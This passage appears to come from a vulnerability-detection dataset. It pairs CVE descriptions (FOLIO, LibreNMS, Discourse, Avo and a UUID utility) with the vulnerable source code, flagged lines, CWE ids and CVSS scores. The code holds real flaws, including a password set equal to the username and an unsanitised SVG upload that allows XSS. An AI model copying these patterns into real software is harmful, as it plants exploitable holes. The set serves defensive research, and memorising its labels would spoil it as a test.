logging.getLogger(pathlib.Path(__file__).name)\n\n\ndef configure() -> None:\n    \"\"\"\n    This function is part of setting up _demo_uuid() to generate non-random UUIDs.  See _demo_uuid() documentation for further setup notes.\n    \"\"\"\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid._demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)\n\n\ndef _demo_uuid() -> str:\n    \"\"\"\n    This function generates a repeatable UUID, drawing on non-varying elements of the environment and process call for entropy.\n\n    This function is not intended to be called outside of this module.  Instead, local_uuid() should be called.\n\n    WARNING: This function was developed for use ONLY for reducing (but not eliminating) version-control edits to identifiers when generating sample data.  It creates UUIDs that are decidedly NOT random, and should remain consistent on repeated calls to the importing script.\n\n    To prevent accidental non-random UUID usage, two setup steps need to be done before calling this function:\n\n    * An environment variable, CASE_DEMO_NONRANDOM_UUID_BASE, must be set to a string provided by the caller.  The variable's required value is the path to some directory.  The variable's recommended value is the equivalent of the Make variable \"top_srcdir\" - that is, the root directory of the containing Git repository, some parent of the current process's current working directory.\n    * The configure() function in this module must be called.\n    \"\"\"\n    global DEMO_UUID_BASE\n    global DEMO_UUID_COUNTER\n\n    if os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\") is None:\n        raise ValueError(\n            \"demo_uuid() called without CASE_DEMO_NONRANDOM_UUID_BASE in environment.\"\n        )\n\n    if DEMO_UUID_BASE is None:\n        raise ValueError(\"demo_uuid() called with DEMO_UUID_BASE unset.\")\n\n    parts = [DEMO_UUID_BASE]\n\n    # Component: Incrementing counter.\n    DEMO_UUID_COUNTER += 1\n    parts.append(str(DEMO_UUID_COUNTER))\n\n    return str(uuid.uuid5(uuid.NAMESPACE_URL, \"/\".join(parts)))\n\n\ndef local_uuid() -> str:\n    \"\"\"\n    Generate either a UUID4, or if requested via environment configuration, a non-random demo UUID.\n    \"\"\"\n    global DEMO_UUID_BASE\n    if DEMO_UUID_BASE is None:\n        return str(uuid.uuid4())\n    else:\n        return _demo_uuid()\n"
        }
      ],
      "method_level": [
        "def configure() -> None:\n    \"\"\"\n    This function is part of setting up _demo_uuid() to generate non-random UUIDs.  See _demo_uuid() documentation for further setup notes.\n    \"\"\"\n    global DEMO_UUID_BASE\n\n    if os.getenv(\"DEMO_UUID_REQUESTING_NONRANDOM\") == \"NONRANDOM_REQUESTED\":\n        warnings.warn(\n            \"Environment variable DEMO_UUID_REQUESTING_NONRANDOM is deprecated.  See case_utils.local_uuid._demo_uuid for usage notes on its replacement, CASE_DEMO_NONRANDOM_UUID_BASE.  Proceeding with random UUIDs.\",\n            FutureWarning,\n        )\n        return\n\n    env_base_dir_name = os.getenv(\"CASE_DEMO_NONRANDOM_UUID_BASE\")\n    if env_base_dir_name is None:\n        return\n\n    base_dir_original_path = pathlib.Path(env_base_dir_name)\n    if not base_dir_original_path.exists():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to an existing directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n    if not base_dir_original_path.is_dir():\n        warnings.warn(\n            \"Environment variable CASE_DEMO_NONRANDOM_UUID_BASE is expected to refer to a directory.  Proceeding with random UUIDs.\",\n            RuntimeWarning,\n        )\n        return\n\n    # Component: An emphasis this is an example.\n    demo_uuid_base_parts = [\"example.org\"]\n\n    # Component: Present working directory, relative to CASE_DEMO_NONRANDOM_UUID_BASE if that environment variable is an ancestor of pwd.\n    base_dir_resolved_path = base_dir_original_path.resolve()\n    srcdir_original_path = pathlib.Path(os.getcwd())\n    srcdir_resolved_path = srcdir_original_path.resolve()\n    # _logger.debug(\"base_dir_resolved_path = %r.\", base_dir_resolved_path)\n    # _logger.debug(\"srcdir_resolved_path = %r.\", srcdir_resolved_path)\n    try:\n        srcdir_relative_path = srcdir_resolved_path.relative_to(base_dir_resolved_path)\n        # _logger.debug(\"srcdir_relative_path = %r.\", srcdir_relative_path)\n        demo_uuid_base_parts.append(str(srcdir_relative_path))\n    except ValueError:\n        # If base_dir is not an ancestor directory of srcdir, default to srcdir.\n        # _logger.debug(\"PWD is not relative to base path.\")\n        demo_uuid_base_parts.append(str(srcdir_resolved_path))\n\n    # Component: Command of argument vector.\n    env_venv_name = os.getenv(\"VIRTUAL_ENV\")\n    if env_venv_name is None:\n        demo_uuid_base_parts.append(sys.argv[0])\n    else:\n        command_original_path = pathlib.Path(sys.argv[0])\n        command_resolved_path = command_original_path.resolve()\n        venv_original_path = pathlib.Path(env_venv_name)\n        venv_resolved_path = venv_original_path.resolve()\n        try:\n            command_relative_path = command_resolved_path.relative_to(\n                venv_resolved_path\n            )\n            # _logger.debug(\"command_relative_path = %r.\", command_relative_path)\n            demo_uuid_base_parts.append(str(command_relative_path))\n        except ValueError:\n            # _logger.debug(\"Command path is not relative to virtual environment path.\")\n            demo_uuid_base_parts.append(str(command_resolved_path))\n\n    if len(sys.argv) > 1:\n        # Component: Arguments of argument vector.\n        demo_uuid_base_parts.extend(sys.argv[1:])\n\n    # _logger.debug(\"demo_uuid_base_parts = %r.\", demo_uuid_base_parts)\n\n    DEMO_UUID_BASE = \"/\".join(demo_uuid_base_parts)"
      ],
      "hunk_level": [
        {
          "line_no": 100,
          "content": "        try:"
        },
        {
          "line_no": 106,
          "content": "        except ValueError:"
        },
        {
          "line_no": 107,
          "content": "            # _logger.debug(\"Command path is not relative to virtual environment path.\")"
        },
        {
          "line_no": 108,
          "content": "            demo_uuid_base_parts.append(str(command_resolved_path))"
        }
      ]
    },
    "cwe": [
      "CWE-215",
      "CWE-337"
    ],
    "severity": "LOW",
    "cvss_score": 2.2,
    "cvss_version": 3.1
  },
  {
    "id": 129,
    "cve": "CVE-2024-23687",
    "description": "Hard-coded credentials in FOLIO mod-data-export-spring versions before 1.5.4 and from 2.0.0 to 2.0.2 allows unauthenticated users to access critical APIs, modify user data, modify configurations including single-sign-on, and manipulate fees/fines.\n\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/main/java/org/folio/des/security/AuthService.java",
          "content": "package org.folio.des.security;\n\nimport lombok.RequiredArgsConstructor;\nimport lombok.extern.log4j.Log4j2;\nimport org.apache.commons.collections4.CollectionUtils;\nimport org.apache.commons.lang3.StringUtils;\nimport org.folio.des.client.AuthClient;\nimport org.folio.des.client.UsersClient;\nimport org.folio.des.domain.dto.SystemUserParameters;\nimport org.folio.des.domain.dto.User;\nimport org.folio.spring.integration.XOkapiHeaders;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.http.ResponseEntity;\nimport org.springframework.stereotype.Service;\n\nimport java.util.Optional;\n\n@Service\n@Log4j2\n@RequiredArgsConstructor\npublic class AuthService {\n\n  private final AuthClient authClient;\n  private final UsersClient usersClient;\n\n  @Value(\"${folio.system.username}\")\n  private String username;\n\n  public String getTokenForSystemUser(String tenant, String url) {\n    SystemUserParameters userParameters =\n        SystemUserParameters.builder()\n            .okapiUrl(url)\n            .tenantId(tenant)\n            .username(username)\n            .password(username)\n            .build();\n\n    log.info(\"Attempt login with url={} tenant={} username={}.\", url, tenant, username);\n\n    ResponseEntity<String> authResponse = authClient.getApiKey(userParameters);\n\n    var token = authResponse.getHeaders().get(XOkapiHeaders.TOKEN);\n    if (isNotEmpty(token)) {\n      log.info(\"Logged in as {}.\", username);\n      userParameters.setOkapiToken(token.get(0));\n    } else {\n      log.error(\"Can't get token logging in as {}.\", username);\n    }\n    return userParameters.getOkapiToken();\n  }\n\n  public String getSystemUserId() {\n    Optional<User> optionalUser = usersClient.getUsersByQuery(\"username==\" + username).getUsers().stream().findFirst();\n\n    if (optionalUser.isEmpty()) {\n      log.error(\"Can't find user id by username {}.\", username);\n      return null;\n    }\n    return optionalUser.get().getId();\n  }\n\n  private boolean isNotEmpty(java.util.List<String> token) {\n    return CollectionUtils.isNotEmpty(token) && StringUtils.isNotBlank(token.get(0));\n  }\n\n  public void saveCredentials(SystemUserParameters systemUserParameters) {\n    authClient.saveCredentials(systemUserParameters);\n\n    log.info(\"Saved credentials for user {}.\", systemUserParameters.getUsername());\n  }\n}\n"
        },
        {
          "name": "src/main/java/org/folio/des/security/SecurityManagerService.java",
          "content": "package org.folio.des.security;\n\nimport com.google.common.io.Resources;\nimport java.io.IOException;\nimport java.nio.charset.StandardCharsets;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Optional;\nimport java.util.UUID;\nimport lombok.RequiredArgsConstructor;\nimport lombok.extern.log4j.Log4j2;\nimport org.apache.commons.collections4.CollectionUtils;\nimport org.apache.commons.lang3.StringUtils;\nimport org.folio.des.client.PermissionsClient;\nimport org.folio.des.client.UsersClient;\nimport org.folio.des.domain.dto.Personal;\nimport org.folio.des.domain.dto.SystemUserParameters;\nimport org.folio.des.domain.dto.User;\nimport org.folio.des.domain.dto.permissions.Permission;\nimport org.folio.des.domain.dto.permissions.PermissionUser;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Component;\n\n@Component\n@Log4j2\n@RequiredArgsConstructor\npublic class SecurityManagerService {\n\n  private static final String PERMISSIONS_FILE_PATH = \"permissions/system-user-permissions.csv\";\n  private static final String USER_LAST_NAME = \"SystemDataExportS\";\n\n  private final PermissionsClient permissionsClient;\n  private final UsersClient usersClient;\n  private final AuthService authService;\n\n  @Value(\"${folio.system.username}\")\n  private String username;\n\n  public void prepareSystemUser(String okapiUrl, String tenantId) {\n    Optional<User> userOptional = getUser(username);\n\n    User user;\n    if (userOptional.isPresent()) {\n      user = userOptional.get();\n      updateUser(user);\n    } else {\n      user = createUser(username);\n      authService.saveCredentials(SystemUserParameters.builder()\n          .id(UUID.randomUUID())\n          .username(username)\n          .password(username)\n          .okapiUrl(okapiUrl)\n          .tenantId(tenantId)\n          .build());\n    }\n\n    Optional<PermissionUser> permissionUserOptional = permissionsClient.get(\"userId==\" + user.getId())\n        .getPermissionUsers()\n        .stream()\n        .findFirst();\n    if (permissionUserOptional.isPresent()) {\n      addPermissions(permissionUserOptional.get());\n    } else {\n      createPermissionUser(user.getId());\n    }\n  }\n\n  private Optional<User> getUser(String username) {\n    return usersClient.getUsersByQuery(\"username==\" + username).getUsers().stream().findFirst();\n  }\n\n  private User createUser(String username) {\n    var result = createUserObject(username);\n    log.info(\"Creating {}.\", result);\n    usersClient.saveUser(result);\n    return result;\n  }\n\n  private void updateUser(User user) {\n    if (existingUserUpToDate(user)) {\n      log.info(\"{} is up to date.\", user);\n    } else {\n      populateMissingUserProperties(user);\n      log.info(\"Updating {}.\", user);\n      usersClient.updateUser(user.getId(), user);\n    }\n  }\n\n  private PermissionUser createPermissionUser(String userId) {\n    List<String> perms = readPermissionsFromResource(PERMISSIONS_FILE_PATH);\n    if (CollectionUtils.isEmpty(perms)) {\n      throw new IllegalStateException(\"No user permissions found in \" + PERMISSIONS_FILE_PATH);\n    }\n\n    var permissionUser = PermissionUser.of(UUID.randomUUID().toString(), userId, perms);\n    log.info(\"Creating {}.\", permissionUser);\n    return permissionsClient.create(permissionUser);\n  }\n\n  private void addPermissions(PermissionUser permissionUser) {\n    var permissions = readPermissionsFromResource(PERMISSIONS_FILE_PATH);\n    if (CollectionUtils.isEmpty(permissions)) {\n      throw new IllegalStateException(\"No user permissions found in \" + PERMISSIONS_FILE_PATH);\n    }\n\n    permissions.removeAll(permissionUser.getPermissions());\n    permissions.forEach(permission -> {\n      var p = new Permission();\n      p.setPermissionName(permission);\n      try {\n        log.info(\"Adding to user {} permission {}.\", permissionUser.getUserId(), p);\n        permissionsClient.addPermission(permissionUser.getUserId(), p);\n      } catch (Exception e) {\n        log.error(String.format(\"Error adding permission %s to %s.\", permission, username), e);\n      }\n    });\n  }\n\n  private List<String> readPermissionsFromResource(String permissionsFilePath) {\n    List<String> result = new ArrayList<>();\n    var url = Resources.getResource(permissionsFilePath);\n\n    try {\n      result = Resources.readLines(url, StandardCharsets.UTF_8);\n    } catch (IOException e) {\n      log.error(String.format(\"Can't read user permissions from %s.\", permissionsFilePath), e);\n    }\n\n    return result;\n  }\n\n  private User createUserObject(String username) {\n    final var result = new User();\n\n    result.setId(UUID.randomUUID().toString());\n    result.setActive(true);\n    result.setUsername(username);\n\n    populateMissingUserProperties(result);\n\n    return result;\n  }\n\n  private boolean existingUserUpToDate(User user) {\n    return user.getPersonal() != null && StringUtils.isNotBlank(user.getPersonal().getLastName());\n  }\n\n  private User populateMissingUserProperties(User user) {\n    user.setPersonal(new Personal());\n    user.getPersonal().setLastName(USER_LAST_NAME);\n    return user;\n  }\n\n}\n"
        }
      ],
      "method_level": [
        "public String getTokenForSystemUser(String tenant, String url) {\n    SystemUserParameters userParameters =\n        SystemUserParameters.builder()\n            .okapiUrl(url)\n            .tenantId(tenant)\n            .username(username)\n            .password(username)\n            .build();\n\n    log.info(\"Attempt login with url={} tenant={} username={}.\", url, tenant, username);\n\n    ResponseEntity<String> authResponse = authClient.getApiKey(userParameters);\n\n    var token = authResponse.getHeaders().get(XOkapiHeaders.TOKEN);\n    if (isNotEmpty(token)) {\n      log.info(\"Logged in as {}.\", username);\n      userParameters.setOkapiToken(token.get(0));\n    } else {\n      log.error(\"Can't get token logging in as {}.\", username);\n    }\n    return userParameters.getOkapiToken();\n  }",
        "public void prepareSystemUser(String okapiUrl, String tenantId) {\n    Optional<User> userOptional = getUser(username);\n\n    User user;\n    if (userOptional.isPresent()) {\n      user = userOptional.get();\n      updateUser(user);\n    } else {\n      user = createUser(username);\n      authService.saveCredentials(SystemUserParameters.builder()\n          .id(UUID.randomUUID())\n          .username(username)\n          .password(username)\n          .okapiUrl(okapiUrl)\n          .tenantId(tenantId)\n          .build());\n    }\n\n    Optional<PermissionUser> permissionUserOptional = permissionsClient.get(\"userId==\" + user.getId())\n        .getPermissionUsers()\n        .stream()\n        .findFirst();\n    if (permissionUserOptional.isPresent()) {\n      addPermissions(permissionUserOptional.get());\n    } else {\n      createPermissionUser(user.getId());\n    }\n  }"
      ],
      "hunk_level": [
        {
          "line_no": 35,
          "content": "            .password(username)"
        },
        {
          "line_no": 48,
          "content": "      authService.saveCredentials(SystemUserParameters.builder()"
        },
        {
          "line_no": 49,
          "content": "          .id(UUID.randomUUID())"
        },
        {
          "line_no": 50,
          "content": "          .username(username)"
        },
        {
          "line_no": 51,
          "content": "          .password(username)"
        },
        {
          "line_no": 52,
          "content": "          .okapiUrl(okapiUrl)"
        },
        {
          "line_no": 53,
          "content": "          .tenantId(tenantId)"
        },
        {
          "line_no": 54,
          "content": "          .build());"
        }
      ]
    },
    "cwe": [
      "CWE-798"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.1,
    "cvss_version": 3.1
  },
  {
    "id": 1213,
    "cve": "CVE-2024-47528",
    "description": "LibreNMS is an open-source, PHP/MySQL/SNMP-based network monitoring system. Stored Cross-Site Scripting (XSS) can be achieved by uploading a new Background for a Custom Map. Users with \"admin\" role can set background for a custom map, this allow the upload of SVG file that can contain XSS payload which will trigger on load. This led to Stored Cross-Site Scripting (XSS). The vulnerability is fixed in 24.9.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/Http/Controllers/Maps/CustomMapBackgroundController.php",
          "content": "<?php\n/**\n * CustomMapController.php\n *\n * Controller for custom maps\n *\n * This program is free software: you can redistribute it and/or modify\n * it under the terms of the GNU General Public License as published by\n * the Free Software Foundation, either version 3 of the License, or\n * (at your option) any later version.\n *\n * This program is distributed in the hope that it will be useful,\n * but WITHOUT ANY WARRANTY; without even the implied warranty of\n * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.See the\n * GNU General Public License for more details.\n *\n * You should have received a copy of the GNU General Public License\n * along with this program.  If not, see <https://www.gnu.org/licenses/>.\n *\n * @link       https://www.librenms.org\n *\n * @copyright  2023 Steven Wilton\n * @author     Steven Wilton <swilton@fluentit.com.au>\n */\n\nnamespace App\\Http\\Controllers\\Maps;\n\nuse App\\Http\\Controllers\\Controller;\nuse App\\Models\\CustomMap;\nuse App\\Models\\CustomMapBackground;\nuse Illuminate\\Foundation\\Http\\FormRequest;\nuse Illuminate\\Support\\Facades\\Cache;\n\nclass CustomMapBackgroundController extends Controller\n{\n    public function get(CustomMap $map)\n    {\n        $this->authorize('view', $map);\n\n        if ($map->background_type !== 'image') {\n            abort(404);\n        }\n\n        // explicitly use file cache\n        try {\n            $imageContent = Cache::driver('file')\n                ->remember($this->getCacheKey($map), new \\DateInterval('P30D'), fn () => $map->background->background_image);\n        } catch (\\ErrorException $e) {\n            // if cache fails, just load from database :(\n            $imageContent = $map->background->background_image;\n        }\n\n        if (empty($imageContent)) {\n            abort(404);\n        }\n\n        return response($imageContent, headers: [\n            'Content-Type' => $map->background_data['mime'] ?? getimagesizefromstring($imageContent)['mime'] ?? 'image/jpeg',\n        ]);\n    }\n\n    public function save(FormRequest $request, CustomMap $map)\n    {\n        $this->authorize('update', $map);\n        $this->validate($request, [\n            'type' => 'in:image,color,map,none',\n            'image' => 'required_if:type,image|mimes:png,jpg,svg,gif',\n            'color' => 'required_if:type,color|regex:/^#[0-9a-f]{6,8}$/',\n            'lat' => 'required_if:type,map|numeric|between:-90,90',\n            'lng' => 'required_if:type,map|numeric|between:-180,180',\n            'zoom' => 'required_if:type,map|integer|between:0,19',\n            'layer' => 'string|regex:/^[a-zA-Z]*$/',\n        ]);\n\n        $map->background_type = $request->type;\n        $this->updateBackgroundImage($map, $request);\n        $map->background_data = array_merge($map->background_data ?? [], $request->only([\n            'color',\n            'lat',\n            'lng',\n            'zoom',\n            'layer',\n        ]));\n\n        $map->save();\n\n        return response()->json([\n            'bgtype' => $map->background_type,\n            'bgdata' => $map->getBackgroundConfig(),\n        ]);\n    }\n\n    private function updateBackgroundImage(CustomMap $map, FormRequest $request): void\n    {\n        if ($map->background_type == 'image') {\n            if ($request->image) {\n                // if image type and we have image data (new image) save it\n                $background = $map->background ?? new CustomMapBackground;\n                $background->background_image = $request->image->getContent();\n                $map->background()->save($background);\n                Cache::driver('file')->forget($this->getCacheKey($map)); // clear old image cache if present\n                $map->background_data = array_merge($map->background_data ?? [], [\n                    'version' => md5($background->background_image),\n                    'original_filename' => $request->image->getClientOriginalName(),\n                    'mime' => $request->image->getMimeType(),\n                ]);\n            }\n        } elseif ($map->getOriginal('background_type') == 'image') {\n            // if no longer image, clean up. if there are multiple web servers, it will only clear from the local.\n            Cache::driver('file')->forget($this->getCacheKey($map));\n            $map->background()->delete();\n            // remove image keys from background data\n            $map->background_data = array_diff_key($map->background_data ?? [], [\n                'version' => 1,\n                'original_filename' => 1,\n                'mime' => 1,\n            ]);\n        }\n    }\n\n    private function getCacheKey(CustomMap $map): string\n    {\n        return 'custommap_background_' . $map->custom_map_id . ':' . ($map->background_data['version'] ?? '');\n    }\n}\n"
        }
      ],
      "method_level": [
        "private function updateBackgroundImage(CustomMap $map, FormRequest $request): void\n    {\n        if ($map->background_type == 'image') {\n            if ($request->image) {\n                // if image type and we have image data (new image) save it\n                $background = $map->background ?? new CustomMapBackground;\n                $background->background_image = $request->image->getContent();\n                $map->background()->save($background);\n                Cache::driver('file')->forget($this->getCacheKey($map)); // clear old image cache if present\n                $map->background_data = array_merge($map->background_data ?? [], [\n                    'version' => md5($background->background_image),\n                    'original_filename' => $request->image->getClientOriginalName(),\n                    'mime' => $request->image->getMimeType(),\n                ]);\n            }\n        } elseif ($map->getOriginal('background_type') == 'image') {\n            // if no longer image, clean up. if there are multiple web servers, it will only clear from the local.\n            Cache::driver('file')->forget($this->getCacheKey($map));\n            $map->background()->delete();\n            // remove image keys from background data\n            $map->background_data = array_diff_key($map->background_data ?? [], [\n                'version' => 1,\n                'original_filename' => 1,\n                'mime' => 1,\n            ]);\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 99,
          "content": "                $background->background_image = $request->image->getContent();"
        },
        {
          "line_no": 105,
          "content": "                    'mime' => $request->image->getMimeType(),"
        }
      ]
    },
    "cwe": [
      "CWE-434",
      "CWE-79",
      "CWE-116"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.6,
    "cvss_version": 4.0
  },
  {
    "id": 123,
    "cve": "CVE-2025-32376",
    "description": "Discourse is an open-source discussion platform. Prior to versions 3.4.3 on the stable branch and 3.5.0.beta3 on the beta branch, the users limit for a DM can be bypassed, thus giving the ability to potentially create a DM with every user from a site in it. This issue has been patched in stable version 3.4.3 and beta version 3.5.0.beta3.",
    "vulnerability": {
      "file_level": [
        {
          "name": "plugins/chat/app/services/chat/add_users_to_channel.rb",
          "content": "# frozen_string_literal: true\n\nmodule Chat\n  # Service responsible to add users to a channel.\n  # The guardian passed in is the \"acting user\" when adding users.\n  # The service is essentially creating memberships for the users.\n  #\n  # @example\n  #  ::Chat::AddUsersToChannel.call(\n  #    guardian: guardian,\n  #    params: {\n  #      channel_id: 1,\n  #      usernames: [\"bob\", \"alice\"],\n  #    }\n  #  )\n  #\n  class AddUsersToChannel\n    include Service::Base\n\n    # @!method self.call(guardian:, params:)\n    #   @param [Guardian] guardian\n    #   @param [Hash] params\n    #   @option params [Integer] :channel_id ID of the channel\n    #   @option params [Array<String>] :usernames\n    #   @option params [Array<String>] :groups\n    #   @return [Service::Base::Context]\n\n    params do\n      attribute :usernames, :array\n      attribute :groups, :array\n      attribute :channel_id, :integer\n\n      validates :channel_id, presence: true\n      validate :target_presence\n\n      def target_presence\n        usernames.present? || groups.present?\n      end\n    end\n\n    lock(:channel_id) do\n      model :channel\n      policy :can_add_users_to_channel\n      model :target_users, optional: true\n      policy :satisfies_dms_max_users_limit,\n             class_name: Chat::DirectMessageChannel::Policy::MaxUsersExcess\n\n      transaction do\n        step :upsert_memberships\n        step :recompute_users_count\n        step :notice_channel\n      end\n    end\n\n    private\n\n    def fetch_channel(params:)\n      ::Chat::Channel.includes(:chatable).find_by(id: params.channel_id)\n    end\n\n    def can_add_users_to_channel(guardian:, channel:)\n      return false if !guardian.user.admin? && !channel.joined_by?(guardian.user)\n\n      channel.direct_message_channel? && (channel.chatable.group || channel.messages_count == 0)\n    end\n\n    def fetch_target_users(params:, channel:)\n      ::Chat::UsersFromUsernamesAndGroupsQuery.call(\n        usernames: params.usernames,\n        groups: params.groups,\n        excluded_user_ids: channel.chatable.direct_message_users.pluck(:user_id),\n        dm_channel: channel.direct_message_channel?,\n      )\n    end\n\n    def upsert_memberships(channel:, target_users:)\n      always_level = ::Chat::UserChatChannelMembership::NOTIFICATION_LEVELS[:always]\n\n      memberships =\n        target_users.map do |user|\n          {\n            user_id: user.id,\n            chat_channel_id: channel.id,\n            muted: false,\n            following: true,\n            notification_level: always_level,\n            created_at: Time.zone.now,\n            updated_at: Time.zone.now,\n          }\n        end\n\n      if memberships.blank?\n        context[:added_user_ids] = []\n        return\n      end\n\n      context[:added_user_ids] = ::Chat::UserChatChannelMembership\n        .upsert_all(\n          memberships,\n          unique_by: %i[user_id chat_channel_id],\n          returning: Arel.sql(\"user_id, (xmax = '0') as inserted\"),\n        )\n        .select { |row| row[\"inserted\"] }\n        .map { |row| row[\"user_id\"] }\n\n      ::Chat::DirectMessageUser.upsert_all(\n        context.added_user_ids.map do |id|\n          {\n            user_id: id,\n            direct_message_channel_id: channel.chatable.id,\n            created_at: Time.zone.now,\n            updated_at: Time.zone.now,\n          }\n        end,\n        unique_by: %i[direct_message_channel_id user_id],\n      )\n    end\n\n    def recompute_users_count(channel:)\n      return if context.added_user_ids.blank?\n\n      channel.update!(\n        user_count: ::Chat::ChannelMembershipsQuery.count(channel),\n        user_count_stale: false,\n      )\n    end\n\n    def notice_channel(guardian:, channel:, target_users:)\n      added_users = target_users.select { |u| context.added_user_ids.include?(u.id) }\n\n      return if added_users.blank?\n\n      ::Chat::CreateMessage.call(\n        guardian: Discourse.system_user.guardian,\n        params: {\n          chat_channel_id: channel.id,\n          message:\n            I18n.t(\n              \"chat.channel.users_invited_to_channel\",\n              invited_users: added_users.map { |u| \"@#{u.username}\" }.join(\", \"),\n              inviting_user: \"@#{guardian.user.username}\",\n              count: added_users.count,\n            ),\n        },\n      ) { on_failure { fail!(failure: \"Failed to notice the channel\") } }\n    end\n  end\nend\n"
        }
      ],
      "method_level": [
        "def target_presence\n        usernames.present? || groups.present?\n      end",
        "def can_add_users_to_channel(guardian:, channel:)\n      return false if !guardian.user.admin? && !channel.joined_by?(guardian.user)\n\n      channel.direct_message_channel? && (channel.chatable.group || channel.messages_count == 0)\n    end",
        "def fetch_target_users(params:, channel:)\n      ::Chat::UsersFromUsernamesAndGroupsQuery.call(\n        usernames: params.usernames,\n        groups: params.groups,\n        excluded_user_ids: channel.chatable.direct_message_users.pluck(:user_id),\n        dm_channel: channel.direct_message_channel?,\n      )\n    end"
      ],
      "hunk_level": [
        {
          "line_no": 36,
          "content": "      def target_presence"
        },
        {
          "line_no": 37,
          "content": "        usernames.present? || groups.present?"
        },
        {
          "line_no": 38,
          "content": "      end"
        },
        {
          "line_no": 64,
          "content": "      channel.direct_message_channel? && (channel.chatable.group || channel.messages_count == 0)"
        },
        {
          "line_no": 67,
          "content": "    def fetch_target_users(params:, channel:)"
        },
        {
          "line_no": 73,
          "content": "      )"
        }
      ]
    },
    "cwe": [
      "CWE-284"
    ],
    "severity": "MEDIUM",
    "cvss_score": 4.8,
    "cvss_version": 4.0
  },
  {
    "id": 92,
    "cve": "CVE-2024-22411",
    "description": "Avo is a framework to create admin panels for Ruby on Rails apps. In Avo 3 pre12, any HTML inside text that is passed to `error` or `succeed` in an `Avo::BaseAction` subclass will be rendered directly without sanitization in the toast/notification that appears in the UI on Action completion. A malicious user could exploit this vulnerability to trigger a cross site scripting attack on an unsuspecting user. This issue has been addressed in the 3.3.0 and 2.47.0 releases of Avo. Users are advised to upgrade.",
    "vulnerability": {
      "file_level": [
        {
          "name": "app/javascript/js/controllers/fields/key_value_controller.js",
          "content": "/* eslint-disable max-len */\nimport { Controller } from '@hotwired/stimulus'\nimport { castBoolean } from '../../helpers/cast_boolean'\n\nexport default class extends Controller {\n  static targets = ['input', 'controller', 'rows']\n\n  fieldValue = []\n\n  options = {}\n\n  get keyInputDisabled() {\n    return !this.options.editable || this.options.disable_editing_keys\n  }\n\n  get valueInputDisabled() {\n    return !this.options.editable\n  }\n\n  connect() {\n    this.setOptions()\n\n    try {\n      const objectValue = JSON.parse(this.inputTarget.value)\n      Object.keys(objectValue).forEach((key) => this.fieldValue.push([key, objectValue[key]]))\n    } catch (error) {\n      this.fieldValue = []\n    }\n\n    this.updateKeyValueComponent()\n  }\n\n  addRow() {\n    if (this.options.disable_adding_rows || !this.options.editable) return\n    this.fieldValue.push(['', ''])\n    this.updateKeyValueComponent()\n    this.focusLastRow()\n  }\n\n  deleteRow(event) {\n    if (this.options.disable_deleting_rows || !this.options.editable) return\n    const { index } = event.params\n    this.fieldValue.splice(index, 1)\n    this.updateTextareaInput()\n    this.updateKeyValueComponent()\n  }\n\n  focusLastRow() {\n    return this.rowsTarget.querySelector('.flex.key-value-row:last-child 